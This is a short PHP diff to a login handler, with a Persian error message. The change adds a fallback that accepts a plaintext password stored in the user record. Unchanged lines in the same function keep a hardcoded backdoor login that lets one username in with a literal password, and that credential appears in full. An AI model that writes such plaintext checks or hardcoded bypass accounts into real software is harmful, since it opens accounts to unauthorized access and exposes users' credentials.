@@ -27,8 +27,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $error = 'نام کاربری یا کلمه عبور اشتباه است.';
         } else {
             $hash = $user['password_hash'] ?? '';
+            $plain = $user['password'] ?? '';
             $isOk = false;
             if ($hash && password_verify($password, $hash)) {
+                $isOk = true;
+            } elseif ($plain && $plain === $password) {
                 $isOk = true;
             } elseif (strtolower($username) === 'mohusyn' && $password === 'Smosh1387') {
                 $isOk = true;
